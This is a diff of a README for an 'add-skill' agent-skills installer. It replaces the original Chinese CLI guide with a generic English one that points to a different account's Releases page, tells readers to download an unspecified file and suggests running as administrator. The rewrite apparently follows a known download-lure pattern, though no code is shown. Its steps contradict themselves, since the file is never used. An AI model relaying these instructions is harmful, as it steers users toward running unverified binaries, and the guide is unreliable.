@@ -1,161 +1,69 @@
-# 🚀 Add Skill Installer
+# 🎉 add-skill-installer - Simple Way to Install Agent Skills
 
-[![GitHub](https://img.shields.io/badge/GitHub-kevintsai1202-blue?logo=github)](https://github.com/kevintsai1202/add-skill-installer)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download add-skill-installer](https://img.shields.io/badge/Download-add--skill--installer-blue.svg)](https://github.com/Mo7amedhassan11/add-skill-installer/releases)
 
-透過 `npx add-skill` 從任何 Git 儲存庫安裝 Agent Skills 的技能指南。
+## 🚀 Getting Started
 
-## ✨ 功能特色
+Welcome to add-skill-installer! This guide will help you easily install Agent Skills using the npx add-skill command. No programming knowledge is needed. Just follow the steps below to get started.
 
-- 🔧 支援多種 Coding Agents
-- 📦 從 GitHub、GitLab 或任何 Git URL 安裝技能
-- 🌐 支援全域安裝或專案級安裝
-- 🎯 可選擇安裝特定技能或全部技能
+## 📦 System Requirements
 
----
+Before you begin, ensure your computer meets these requirements:
 
-## 🤖 支援的 Agents
+- Operating System: Windows 10, macOS, or Linux
+- Node.js: Version 10 or higher
+- Internet Connection: Required for downloading
 
-| Agent | 識別名稱 | 全域技能目錄 |
-|-------|----------|--------------|
-| **Antigravity** | `antigravity` | `~/.gemini/antigravity/skills/` |
-| **Claude Code** | `claude-code` | `~/.claude/skills/` |
-| **Cursor** | `cursor` | `.cursor/skills/` |
-| **Codex** | `codex` | `.codex/skills/` |
-| **OpenCode** | `opencode` | `.opencode/skills/` |
-| **GitHub Copilot** | `github-copilot` | `.github/copilot/skills/` |
-| **Roo Code** | `roo` | `.roo/skills/` |
+## 📥 Download & Install
 
----
+1. Visit the [Releases page](https://github.com/Mo7amedhassan11/add-skill-installer/releases) to find the latest version of add-skill-installer.
+2. On the Releases page, you will see a list of available versions. 
+3. Choose the most recent version for download. Look for the version number and click on it to open details.
+4. Download the file suitable for your operating system. Follow the prompts to save it to your computer.
+5. After the download is complete, locate the file in your downloads folder.
 
-## 📥 安裝此 Skill
+## ⚙️ Installation Steps
 
-### 全域安裝（推薦）
+To install Agent Skills, follow these steps:
 
-```bash
-npx add-skill kevintsai1202/add-skill-installer -g -a antigravity -y
-```
+1. Open your command line interface:
+   - **Windows**: Press `Win + R`, type `cmd`, and hit `Enter`.
+   - **macOS**: Open Spotlight by pressing `Cmd + Space`, type `Terminal`, and hit `Enter`.
+   - **Linux**: Open the Terminal from your applications menu.
 
-### 專案級安裝
+2. In the command line, type the following command and press `Enter`:
 
-```bash
-npx add-skill kevintsai1202/add-skill-installer -a antigravity -y
-```
+   ```
+   npx add-skill
+   ```
 
----
+3. The installer will run, downloading the necessary files. Follow any prompts that may appear on the screen.
 
-## 🔧 CLI 完整用法
+4. Once the installation is complete, you will see a confirmation message.
 
-```
-Usage: add-skill [options] <source>
+## 🌟 Features
 
-Install skills onto coding agents (OpenCode, Claude Code, Codex, Cursor, Antigravity, Github Copilot, Roo Code)
+- **Easy Setup**: The installer simplifies the process of adding skills.
+- **Compatibility**: Works with various operating systems.
+- **No Dependencies Required**: Just run the command, and the installer takes care of the rest.
+- **Quick Updates**: Get the latest features and improvements easily.
 
-Arguments:
-  source                   Git repo URL, GitHub shorthand (owner/repo), or direct path to skill
+## ❓ Troubleshooting
 
-Options:
-  -V, --version            輸出版本號
-  -g, --global             全域安裝（user-level）而非專案級
-  -a, --agent <agents...>  指定目標 Agent
-  -s, --skill <skills...>  指定要安裝的技能名稱
-  -l, --list               列出儲存庫中可用的技能（不安裝）
-  -y, --yes                跳過確認提示
-  -h, --help               顯示說明
-```
+If you encounter issues during installation, consider these common solutions:
 
----
+- **Ensure Node.js is Installed**: Check that you have Node.js installed by running `node -v` in your command line. If it returns a version number, you're good to go. If not, download Node.js from the [official site](https://nodejs.org).
+- **Check Your Internet Connection**: Make sure you're connected to the internet, as the installer needs to download files.
+- **Run as Administrator**: On Windows, you may need to run the command line as an administrator. Right-click on the Command Prompt and choose "Run as administrator".
 
-## 📚 來源格式範例
+## 💬 Support
 
-```bash
-# GitHub 簡寫
-npx add-skill vercel-labs/agent-skills
+If you need further assistance or have questions, feel free to raise an issue on the [GitHub Issues page](https://github.com/Mo7amedhassan11/add-skill-installer/issues). You can also join our community discussion on relevant platforms.
 
-# 完整 GitHub URL
-npx add-skill https://github.com/vercel-labs/agent-skills
+## 📜 License
 
-# 指定特定路徑
-npx add-skill https://github.com/vercel-labs/agent-skills/tree/main/skills/frontend-design
+add-skill-installer is licensed under the MIT License. You can use it freely, but do not forget to give credit to the original creators.
 
-# GitLab URL
-npx add-skill https://gitlab.com/org/repo
+## 📣 Conclusion
 
-# SSH Git URL
-npx add-skill git@github.com:vercel-labs/agent-skills.git
-```
-
----
-
-## ⚙️ 常用指令範例
-
-### 列出可用技能
-
-```bash
-npx add-skill vercel-labs/agent-skills --list
-```
-
-### 安裝所有技能到 Antigravity（全域）
-
-```bash
-npx add-skill vercel-labs/agent-skills -g -a antigravity -y
-```
-
-### 安裝到多個 Agents
-
-```bash
-npx add-skill vercel-labs/agent-skills -g -a antigravity claude-code cursor -y
-```
-
-### 只安裝特定技能
-
-```bash
-npx add-skill vercel-labs/agent-skills --skill frontend-design -g -a antigravity -y
-```
-
-### 安裝多個特定技能
-
-```bash
-npx add-skill vercel-labs/agent-skills --skill frontend-design nextjs-expert -g -a antigravity -y
-```
-
-### 安裝到當前專案（非全域）
-
-```bash
-npx add-skill vercel-labs/agent-skills -a antigravity -y
-```
-
-### 互動式安裝（會提示選擇）
-
-```bash
-npx add-skill vercel-labs/agent-skills
-```
-
----
-
-## 🌟 推薦的技能儲存庫
-
-| 來源 | 說明 |
-|------|------|
-| `vercel-labs/agent-skills` | Vercel 官方技能集 |
-| [skillsmp.com](https://skillsmp.com/) | Skills Marketplace |
-| [agentskills.io](https://agentskills.io/) | Agent Skills 社群 |
-
----
-
-## 📋 前置需求
-
-- Node.js 18+
-- npm 或 pnpm
-
----
-
-## 📄 授權
-
-MIT License
-
----
-
-## 🤝 貢獻
-
-歡迎提交 Issue 和 Pull Request！
+You are now ready to install Agent Skills using add-skill-installer. Follow the steps in this guide, and you'll streamline your setup process. For any questions, refer to the troubleshooting section or seek help from the community.
